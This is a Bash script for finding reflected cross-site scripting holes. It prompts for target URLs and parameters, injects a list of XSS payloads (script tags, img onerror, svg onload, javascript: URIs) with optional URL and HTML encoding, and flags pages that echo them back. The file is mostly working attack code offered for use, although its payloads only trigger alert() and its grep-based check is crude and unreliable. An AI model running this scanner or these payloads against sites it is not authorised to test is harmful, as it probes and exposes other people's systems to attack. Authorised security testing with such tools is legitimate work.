#!/bin/bash

# Tool: Interactive Reflected XSS Finder
# Description: A Bash script to detect potential Reflected XSS vulnerabilities with encoding checks, multiple parameter testing, context analysis, and saving results.
# Usage: ./xss_finder.sh

# Colors for output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Default output file for saving vulnerable URLs
OUTPUT_FILE="vulnerable_urls.txt"

# Display header
echo -e "${BLUE}"
echo "=============================================="
echo "      Interactive Reflected XSS Finder        "
echo "=============================================="
echo -e "${NC}"

# Prompt for single URL or file containing URLs
echo -e "${GREEN}[1] Enter a single URL to test"
echo -e "[2] Provide a file containing URLs (one per line)${NC}"
read -p "Choose an option (1 or 2): " OPTION

if [ "$OPTION" == "1" ]; then
    read -p "Enter the URL to test: " SINGLE_URL
    URL_LIST=("$SINGLE_URL")
elif [ "$OPTION" == "2" ]; then
    read -p "Enter the path to the file containing URLs: " URL_FILE
    if [ ! -f "$URL_FILE" ]; then
        echo -e "${RED}Error: File $URL_FILE not found.${NC}"
        exit 1
    fi
    mapfile -t URL_LIST < "$URL_FILE"
else
    echo -e "${RED}Invalid option. Exiting.${NC}"
    exit 1
fi

# Prompt for parameters to test
echo -e "${GREEN}Enter the parameters to test (comma-separated, default: q): ${NC}"
read -p "Parameters: " PARAMETERS
PARAMETERS=${PARAMETERS:-q}

# Prompt for encoding checks
echo -e "${GREEN}Enable encoding checks? (URL encoding, HTML encoding) [y/n]: ${NC}"
read -p "Choice: " ENCODING_CHECKS
if [[ "$ENCODING_CHECKS" =~ ^[Yy]$ ]]; then
    ENCODING_CHECKS=true
else
    ENCODING_CHECKS=false
fi

# Prompt for context analysis
echo -e "${GREEN}Analyze context (HTML, JavaScript)? [y/n]: ${NC}"
read -p "Choice: " CONTEXT_ANALYSIS
if [[ "$CONTEXT_ANALYSIS" =~ ^[Yy]$ ]]; then
    CONTEXT_ANALYSIS=true
else
    CONTEXT_ANALYSIS=false
fi

# Prompt for output file
echo -e "${GREEN}Enter the output file to save vulnerable URLs (default: $OUTPUT_FILE): ${NC}"
read -p "Output file: " CUSTOM_OUTPUT_FILE
OUTPUT_FILE=${CUSTOM_OUTPUT_FILE:-$OUTPUT_FILE}

# Payloads to test for Reflected XSS
PAYLOADS=(
    "<script>alert('XSS')</script>"
    "javascript:alert('XSS')"
    "'\"><img src=x onerror=alert('XSS')>"
    "\"><script>alert('XSS')</script>"
    "';alert('XSS');//"
    "\"onmouseover=\"alert('XSS')"
    "<svg/onload=alert('XSS')>"
    "alert(/XSS/)"
)

# Encoding functions
url_encode() {
    echo -n "$1" | perl -pe 's/([^a-zA-Z0-9_.!~*()'\''-])/sprintf("%%%02X", ord($1))/ge'
}

html_encode() {
    echo -n "$1" | perl -pe 's/([<>&'"'"'"])/sprintf("&#x%02X;", ord($1))/ge'
}

# Context analysis functions
analyze_context() {
    local response="$1"
    local payload="$2"

    # Check if payload is reflected in HTML
    if echo "$response" | grep -q "$payload"; then
        echo -e "${YELLOW}[+] Payload reflected in HTML context.${NC}"
    fi

    # Check if payload is reflected in JavaScript
    if echo "$response" | grep -q -E "(<script.*>$payload.*</script>|${payload//</\\<}.*;|=\s*['\"]?$payload['\"]?)"; then
        echo -e "${YELLOW}[+] Payload reflected in JavaScript context.${NC}"
    fi
}

# Save vulnerable URLs to a file
save_vulnerable_url() {
    local url="$1"
    local payload="$2"
    echo -e "${RED}[!] Vulnerable URL: $url${NC}"
    echo -e "Payload: $payload\n" >> "$OUTPUT_FILE"
    echo -e "URL: $url\nPayload: $payload\n" >> "$OUTPUT_FILE"
    echo -e "${BLUE}[*] Saved to $OUTPUT_FILE${NC}"
}

# Clear the output file if it exists
> "$OUTPUT_FILE"

# Function to test a single URL
test_url() {
    local TARGET_URL="$1"
    echo -e "\n${GREEN}[*] Testing URL: $TARGET_URL${NC}"

    # Test each parameter
    IFS=',' read -r -a PARAM_ARRAY <<< "$PARAMETERS"
    for param in "${PARAM_ARRAY[@]}"; do
        echo -e "\n${BLUE}[*] Testing parameter: $param${NC}"

        for payload in "${PAYLOADS[@]}"; do
            echo -e "\n${YELLOW}[>] Testing payload: $payload${NC}"

            # Test original payload
            TEST_URL="${TARGET_URL//$param=*/$param=$payload}"
            RESPONSE=$(curl -s -i "$TEST_URL")

            if echo "$RESPONSE" | grep -q "$payload"; then
                echo -e "${RED}[!] Potential Reflected XSS Found!${NC}"
                echo "URL: $TEST_URL"
                echo "Payload: $payload"
                save_vulnerable_url "$TEST_URL" "$payload"
                if $CONTEXT_ANALYSIS; then
                    analyze_context "$RESPONSE" "$payload"
                fi
            else
                echo -e "${GREEN}[+] No reflection detected.${NC}"
            fi

            # Test URL-encoded payload
            if $ENCODING_CHECKS; then
                ENCODED_PAYLOAD=$(url_encode "$payload")
                TEST_URL="${TARGET_URL//$param=*/$param=$ENCODED_PAYLOAD}"
                RESPONSE=$(curl -s -i "$TEST_URL")

                if echo "$RESPONSE" | grep -q "$ENCODED_PAYLOAD"; then
                    echo -e "${RED}[!] Potential Reflected XSS Found (URL-encoded)!${NC}"
                    echo "URL: $TEST_URL"
                    echo "Payload: $ENCODED_PAYLOAD"
                    save_vulnerable_url "$TEST_URL" "$ENCODED_PAYLOAD"
                    if $CONTEXT_ANALYSIS; then
                        analyze_context "$RESPONSE" "$ENCODED_PAYLOAD"
                    fi
                else
                    echo -e "${GREEN}[+] No reflection detected (URL-encoded).${NC}"
                fi
            fi

            # Test HTML-encoded payload
            if $ENCODING_CHECKS; then
                HTML_ENCODED_PAYLOAD=$(html_encode "$payload")
                TEST_URL="${TARGET_URL//$param=*/$param=$HTML_ENCODED_PAYLOAD}"
                RESPONSE=$(curl -s -i "$TEST_URL")

                if echo "$RESPONSE" | grep -q "$HTML_ENCODED_PAYLOAD"; then
                    echo -e "${RED}[!] Potential Reflected XSS Found (HTML-encoded)!${NC}"
                    echo "URL: $TEST_URL"
                    echo "Payload: $HTML_ENCODED_PAYLOAD"
                    save_vulnerable_url "$TEST_URL" "$HTML_ENCODED_PAYLOAD"
                    if $CONTEXT_ANALYSIS; then
                        analyze_context "$RESPONSE" "$HTML_ENCODED_PAYLOAD"
                    fi
                else
                    echo -e "${GREEN}[+] No reflection detected (HTML-encoded).${NC}"
                fi
            fi
        done
    done
}

# Test all URLs
for URL in "${URL_LIST[@]}"; do
    test_url "$URL"
done

echo -e "\n${BLUE}[*] Scan completed. Check $OUTPUT_FILE for vulnerable URLs.${NC}"
